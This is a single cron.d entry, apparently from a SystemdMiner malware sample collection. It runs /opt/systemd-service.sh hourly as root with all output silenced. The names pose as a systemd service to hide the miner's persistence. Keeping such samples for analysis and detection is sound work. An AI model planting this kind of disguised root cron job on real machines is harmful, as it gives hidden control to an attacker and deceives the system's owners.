# SystemdMiner/2008/etc/cron.d/0systemd-service
58 * * * * root /opt/systemd-service.sh > /dev/null 2>&1 &
